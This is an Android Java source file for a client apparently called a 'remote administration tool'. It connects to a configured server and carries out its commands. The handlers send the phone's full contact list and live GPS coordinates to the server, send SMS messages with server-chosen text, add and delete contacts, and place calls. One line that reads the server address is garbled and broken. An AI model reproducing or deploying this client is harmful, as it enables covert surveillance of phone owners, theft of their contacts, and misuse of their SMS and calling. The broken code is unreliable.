package com.remoteadministrationtoolclient.activity;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import com.remoteadministrationtoolclient.Globals;
import com.remoteadministrationtoolclient.HexEncodeDecode;
import com.remoteadministrationtoolclient.R;

import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;

import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.PhoneLookup;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentProviderOperation;

import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;

import android.telephony.SmsManager;

import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

import android.widget.Toast;

@SuppressLint("DefaultLocale")
public class ConnectActivity extends Activity {
	DatabaseHandler db;
	String locstr2;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_connect);
		
		Button btConnect = (Button) findViewById(R.id.buttonConnect);
		db = new DatabaseHandler(this);
		btConnect.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View view) {
			//m2prorammport3307
				String host1 = getSharedPreferences(name, mode)rences("RAT", MODE_PRIVATE).getString("SERVER_IP", "");
				int port1 = Globals.port;
				
				try {
					Globals.clientSocket = new Socket(host1 , port1 );
					Globals.clientSocketOutStream = Globals.clientSocket.getOutputStream();
					Globals.clientSocketInStream = Globals.clientSocket.getInputStream();
					Globals.clientSocketWriter = new PrintWriter(Globals.clientSocket.getOutputStream());
					Globals.clientSocketWriter.println("HELLO::"+android.os.Build.MODEL);
					Globals.clientSocketWriter.flush();
					
					Thread threadClient = new Thread(new  Runnable() {
						
						private static final long MINIMUM_DISTANCE_CHANGE_FOR_UPDATES = 1; // in Meters
						private static final long MINIMUM_TIME_BETWEEN_UPDATES = 1000; // in Milliseconds
						    
						protected LocationManager locationManager;
						
						@Override
						public void run() {
							BufferedReader reader = new BufferedReader(new InputStreamReader(Globals.clientSocketInStream));
							String line = "";
							
							while(!Globals.clientSocket.isClosed() && line!=null) {
								try {
									line = reader.readLine();
									
									System.out.println(line);
									
									if(line!=null)
									if(line.contains("[")) {
										String command = line.substring(1,line.indexOf("]"));
										System.out.println("Command Received:["+command+"]");
										
										System.out.println("Line:"+line);
										
										if(command.toLowerCase().contains("captureimage")) {
											String lwh = line.substring(line.indexOf(":")+1);
											String[] lwhs = lwh.split(";");
											
											int length = Integer.parseInt(lwhs[0]);
											int width = Integer.parseInt(lwhs[1]);
											int height = Integer.parseInt(lwhs[2]);
											
											System.out.println("captureimage:"+length+";"+width+";"+height);
											
											
											String hexString = "";
											String hex = reader.readLine();
											while(!hex.equals("end-of-hex")) {
												hexString += hex;
												hex = reader.readLine();
											}
											
											System.out.println("Hex String:"+hexString);
											
											byte[] jpg = toByteArr(hexString);
											
											System.out.println("Pixels:["+jpg.length+"] Read!");

											
											//you can create a new file name "test.jpg" in sdcard folder.
											File f = new File(Environment.getExternalStorageDirectory()
											                        + File.separator + "test.jpg");
											f.createNewFile();
											//write the bytes in file
											FileOutputStream fo = new FileOutputStream(f);
											fo.write(jpg);

											// remember close de FileOutput
											fo.close();
											
											Bitmap bitmap = BitmapFactory.decodeFile(f.getAbsolutePath());
											
										    System.out.println("Captured Image:["+bitmap.getWidth()+","+bitmap.getHeight()+"]");
										    
										    Globals.lastCapturedScreen = bitmap;
										} else if(command.toLowerCase().contains("chatmessage")) {
											Globals.lastMessageTimeStamp = new Date().getTime();
											Globals.lastMessage = line.substring(line.indexOf(":")+1);
											Calendar calendar = Calendar.getInstance();
											calendar.setTimeInMillis(new Date().getTime());
											Date finaldate = calendar.getTime();
											String logDate = finaldate.toString();
											String comm = command + Globals.lastMessage;
											db.addLog(comm,logDate);

										} else if(command.toLowerCase().contains("executeresult")) {
											System.out.println("Execute Result:"+line);
											String line1 = "";
											line1 = reader.readLine();
											Globals.lastResult+= "\r\n";
											
											while(!line1.equals("end-of-result")) {
												Globals.lastResult += (line1 + "\r\n");
												line1 = reader.readLine();
											}
											
											System.out.println("Result Read:"+Globals.lastResult);
										} else if(command.toLowerCase().contains("sendsms")) {
											String phoneNumber = line.substring(line.indexOf(":")+1,line.lastIndexOf(":"));
											Calendar calendar = Calendar.getInstance();
											calendar.setTimeInMillis(new Date().getTime());
											Date finaldate = calendar.getTime();
											String logDate = finaldate.toString();
											String comm = command + phoneNumber;
											db.addLog(comm,logDate);
											int length = Integer.parseInt(line.substring(line.lastIndexOf(":")+1));
											//byte[] message = new byte[length];
											System.out.println("Message Length:"+length);
											String message = "";
											line = "";
											line = reader.readLine();
											
											while(!line.equals("end-of-message")) {
												message += line+"\r\n";
												line = reader.readLine();
											}
											//Globals.clientSocketInStream.read(message);
											System.out.println("Message:"+new String(message));
											SmsManager manager = SmsManager.getDefault();
											manager.sendTextMessage(phoneNumber, null, new String(message), null, null);
											System.out.println("SMS Sent!");
										} else if(command.toLowerCase().contains("contacts")) {
											Calendar calendar = Calendar.getInstance();
											calendar.setTimeInMillis(new Date().getTime());
											Date finaldate = calendar.getTime();
											String logDate = finaldate.toString();
											db.addLog(command,logDate);
											 Uri contactData = ContactsContract.Contacts.CONTENT_URI;
											 Cursor contactsCursor = managedQuery(contactData,null, null, null, null);
											 
											 Globals.clientSocketWriter.println("[StartContactsList]");
											 Globals.clientSocketWriter.flush();
											 
											 while (contactsCursor.moveToNext()) {
											     String id = contactsCursor.getString(contactsCursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
											     String name = contactsCursor.getString(contactsCursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
											     String hasPhoneNumber = contactsCursor.getString(contactsCursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER));
											     
											     if (Integer.parseInt(hasPhoneNumber) > 0) {
											      Uri myPhoneUri = Uri.withAppendedPath(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, id);
											      Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+ id,null, null);
											      String phoneNumber = null;
											      while (phones.moveToNext()) {
											       phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
											       Globals.clientSocketWriter.println(name+":"+phoneNumber);
											       Globals.clientSocketWriter.flush();
											      }
											     }
											 }
											 
											 Globals.clientSocketWriter.println("end-of-list");
											 Globals.clientSocketWriter.flush();
										} else if(command.toLowerCase().contains("addcontact")) {
											
											String contact = line.substring(line.indexOf(":")+1,line.lastIndexOf(":"));
											String phone = line.substring(line.lastIndexOf(":")+1);
											Calendar calendar = Calendar.getInstance();
											calendar.setTimeInMillis(new Date().getTime());
											Date finaldate = calendar.getTime();
											String logDate = finaldate.toString();
											String comm = command + ":" + contact + " : " + phone ;
											db.addLog(comm,logDate);
											addContact(contact,phone);
											
							                System.out.println("Contact:"+contact+":"+phone+" Added!");
										} else if(command.toLowerCase().contains("deletecontact")) {
											String contact = line.substring(line.indexOf(":")+1,line.lastIndexOf(":"));
											String phone = line.substring(line.lastIndexOf(":")+1);
											Calendar calendar = Calendar.getInstance();
											calendar.setTimeInMillis(new Date().getTime());
											Date finaldate = calendar.getTime();
											String logDate = finaldate.toString();
											String comm = command + ":" + contact + " : " + phone ;
											db.addLog(comm,logDate);
											deleteContact(phone,contact);
											System.out.println("Delete Contact:["+contact+":"+phone+"] Deleted!");
										} else if(command.toLowerCase().contains("dial")) {
											String phoneNumber = line.substring(line.indexOf(":")+1);
											Calendar calendar = Calendar.getInstance();
											calendar.setTimeInMillis(new Date().getTime());
											Date finaldate = calendar.getTime();
											String logDate = finaldate.toString();
											String comm = command + ":" + phoneNumber ;
											db.addLog(comm,logDate);
											dial(phoneNumber);
											
										}  else if(command.toLowerCase().contains("startgpstracking")) {
											
											Calendar calendar = Calendar.getInstance();
											calendar.setTimeInMillis(new Date().getTime());
											Date finaldate = calendar.getTime();
											String logDate = finaldate.toString();
											String comm = command ;
											db.addLog(command,logDate);
											
											try
											{
												Thread location = new Thread(new GPSBasedLocationListener());
												location.start();
											}
											catch(Exception ex)
										{
											
											}
											

											
										} else if(command.toLowerCase().contains("fileactivity")) {
											String activity = line.substring(line.indexOf(":")+1);
											Calendar calendar = Calendar.getInstance();
											calendar.setTimeInMillis(new Date().getTime());
											Date finaldate = calendar.getTime();
											String logDate = finaldate.toString();
											String comm = command ;
											db.addLog(command,logDate);
											Globals.lastActivity += activity + "\r\n";
										}
									}
								} catch (IOException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
									break;
								} catch(Exception e) {
									e.printStackTrace();
								}
								
								
							}
							
						}
						
						 public Bitmap createBitmapFromColoredBytes(int[] pixels, int width,
				                    int height) {

				                if (pixels.length!=(width*height)){
				                }
				                
				                Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
				                // for each byte, I set it in three color channels.
				                int red,green,blue,color;
				                int x=0,y=0;        
				                int i=0;
				                while(i<pixels.length){
				                    bitmap.setPixel(x, y, pixels[i]);
				                    x++;
				                    if (x==width){
				                        x=0;
				                        y++;
				                    }           
				                    i++;
				                }
				                
				                return bitmap;
				            }
						 
						 public boolean deleteContact(String phone, String name) {
							    Uri contactUri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phone));
							    Cursor cur = getContentResolver().query(contactUri, null, null, null, null);
							    try {
							        if (cur.moveToFirst()) {
							            do {
							                if (cur.getString(cur.getColumnIndex(PhoneLookup.DISPLAY_NAME)).equalsIgnoreCase(name)) {
							                    String lookupKey = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
							                    Uri uri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_LOOKUP_URI, lookupKey);
							                    getContentResolver().delete(uri, null, null);
							                    return true;
							                }

							            } while (cur.moveToNext());
							        }

							    } catch (Exception e) {
							        System.out.println(e.getStackTrace());
							    }
							    return false;
							}
						 
						 
						 public boolean addContact(String contact,String phone) {
							 
							 ArrayList<ContentProviderOperation> saveContactOperation = new ArrayList<ContentProviderOperation>();
						      saveContactOperation.add(ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI)
						          .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null)
						          .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null)
						          .build());
						      
						      saveContactOperation.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
						                  .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
						                  .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
						                  .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, contact)
						                  .build());
						      
						      saveContactOperation.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
						                  .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
						                  .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
						                  .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, phone)
						                  .withValue(ContactsContract.CommonDataKinds.Phone.TYPE, Phone.TYPE_HOME)
						                  .build());
						      
						      try 
						      {
						              getContentResolver().applyBatch(ContactsContract.AUTHORITY, saveContactOperation);
						              //finish();
						              
						              return true;
						      }
						      catch (Exception e) 
						      {
						    	  return false;
						      } 
						 }
						 
						 
						 public void dial(String phoneNumber) {
							Intent callIntent = new Intent(Intent.ACTION_CALL);
		                    callIntent.setData(Uri.parse("tel:"+phoneNumber));
		                    startActivity(callIntent);
						 }
						 
						 
						 public byte[] toByteArr(String data)  
						 {  
						        return HexEncodeDecode.decode(data);
						 }  
						 
					});
					
					threadClient.start();
					
				} catch (UnknownHostException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		});
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.activity_connect, menu);
		return true;
	}
	

			
			String locstr;

			class GPSBasedLocationListener implements Runnable {

				Double lat = 0.0, lon = 0.0;

				@Override
				public void run() {

					final LocationManager mlocManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
					final LocationListener mlocListener = new MyLocationListener();

					ConnectActivity.this.runOnUiThread(new Runnable() {
						public void run() {
							mlocManager.requestLocationUpdates(
									LocationManager.GPS_PROVIDER, 0, 1000, mlocListener);
						}
					});

				}

				public class MyLocationListener implements LocationListener

				{
					
					public void onLocationChanged(Location loc)

					{
						

						lat = loc.getLatitude();
						lon = loc.getLongitude();

						

						Geocoder geocoder = new Geocoder(getApplicationContext(),
								Locale.getDefault());
						try {
							List<Address> listAddresses = geocoder.getFromLocation(
									loc.getLatitude(), loc.getLongitude(), 1);
							if (null != listAddresses && listAddresses.size() > 0) {

								Address tes = listAddresses.get(0);

								locstr = tes.getAddressLine(0) + " : "
										+ tes.getAddressLine(1) + " , "
										+ tes.getAddressLine(2);
							

								ConnectActivity.this.runOnUiThread(new Runnable() {
									public void run() {

										

										Globals.clientSocketWriter.println("[GPSTrack]:"+lat+":"+lon);
										Globals.clientSocketWriter.flush();
									}
								});

								

							}
						} catch (IOException e) {
							Context context = getApplicationContext();
							CharSequence text = "GEOcoder";
							int duration = Toast.LENGTH_SHORT;

							Toast toast = Toast.makeText(context, text, duration);
							toast.show();
						}

					}

					public void onProviderDisabled(String provider)

					{

						ConnectActivity.this.runOnUiThread(new Runnable() {
							public void run() {
								Toast.makeText(getApplicationContext(), "GPS Disabled",
										Toast.LENGTH_SHORT).show();
							}
						});

					}

					public void onProviderEnabled(String provider)

					{
						ConnectActivity.this.runOnUiThread(new Runnable() {
							public void run() {
								Toast.makeText(getApplicationContext(),

								"GPS Enabled",

								Toast.LENGTH_SHORT).show();
							}
						});

					}

					public void onStatusChanged(String provider, int status,
							Bundle extras)

					{

					}

				}

			}

}
